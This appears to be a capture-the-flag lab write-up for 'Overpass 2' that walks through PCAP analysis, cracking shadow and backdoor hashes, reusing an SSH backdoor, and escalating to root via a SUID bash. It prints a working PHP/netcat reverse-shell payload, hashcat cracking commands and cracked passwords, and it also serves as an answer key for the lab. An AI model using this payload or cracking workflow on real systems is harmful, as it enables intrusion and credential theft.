# Overpass 2

## Scenario

- Overpass has been hacked.
- The SOC team captured packets during the attack.
- Objective: determine how the attacker gained access, established persistence, and regain access to the production server.
- PCAP hash:

```text
11c3b2e9221865580295bc662c35c6dc
```

## PCAP Analysis

### Reverse Shell Upload Page

- Use Wireshark statistics to review resolved addresses.
- Resolved address of interest:
  - `140.82.118.4` resolves to GitHub.
- Filter:

```wireshark
ip.src == 140.82.118.4
```

- Follow TCP streams and review stream `1`.

#### Question

What was the URL of the page they used to upload a reverse shell?

#### Answer

```text
/development/
```

### Reverse Shell Payload

#### Question

What payload did the attacker use to gain access?

#### Answer

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

### Privilege Escalation Password

- Found in TCP stream `3`.

#### Question

What password did the attacker use to privesc?

#### Answer

```text
whenevernoteartinstant
```

### Persistence Mechanism

- Also found in TCP stream `3`.

#### Question

How did the attacker establish persistence?

#### Answer

```text
https://github.com/NinjaJc01/ssh-backdoor
```

## Password Hash Cracking

### Shadow Hashes Recovered from PCAP

```text
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

### Cracking Command

```bash
hashcat -m 1800 -a 0 fromShadow /usr/share/wordlists/fasttrack.txt
```

### Crackable Passwords

```text
$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx
$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
```

#### Question

Using the fasttrack wordlist, how many of the system passwords were crackable?

#### Answer

```text
4
```

## Backdoor Code Analysis

### Source Repository

- GitHub source:
  - `https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go`

### Default Backdoor Hash

#### Question

What is the default hash for the backdoor?

#### Answer

```text
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```

### Hardcoded Salt

#### Question

What's the hardcoded salt for the backdoor?

#### Answer

```text
1c362db832f3f864c8c2fe05f2002a05
```

### Attacker's Hash

- Return to the PCAP.
- Review TCP stream `3`.
- The attacker passes the hash as an argument:

```bash
./backdoor -a <hash>
```

#### Answer

```text
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

### Crack the Backdoor Hash

- Add the hardcoded salt to the hash file.
- Crack with hashcat:

```bash
hashcat -m 1710 -a 0 fromPCAP_m1710 /usr/share/wordlists/rockyou.txt
```

#### Answer

```text
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```

- Password: `november16`

## Regaining Access

### Web Enumeration

```bash
dirb http://10.10.169.174 /usr/share/wordlists/dirb/common.txt 2>/dev/null
```

- First directory found:
  - `/aboutus`

### Staff Names from `/aboutus`

- Ninja - Lead Developer
- Pars - SOC Lead, Shibe Enthusiast, and Emotional Support Animal Manager
- Szymex - Head of Security
- Bee - Chief Drinking Water Coordinator
- MuirlandOracle - Cryptography Consultant

### Backdoor SSH Access

- Initial SSH attempt on port `2222` produced this error:

```text
Unable to negotiate with 10.10.5.25 port 2222: no matching host key type found. Their offer: ssh-rsa
```

- Use legacy host key algorithm support:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -p 2222 james@10.10.5.25
```

- The connection worked.

## Root Privilege Escalation

### Checks

- A Python server could be started from the user's folder, allowing files to be transferred to the attacker machine.
- `/etc/passwd` was readable.
- `/etc/sudoers` was not readable.
- `sudo -l` and `visudo` were not usable.

### Writable Directory Search

```bash
find /etc =writable -type d 2>/dev/null
```

- `sudoers.d` appeared writable, but adding a file for James did not work.

### SUID Bash Discovery

```bash
find /home -perm -700 -type f 2>/dev/null
```

- Found a copy of Bash in James' home directory.
- It was owned by root and had the SUID bit set.

### Root Shell

```bash
./.suid_bash -p
```

- Result: root access.
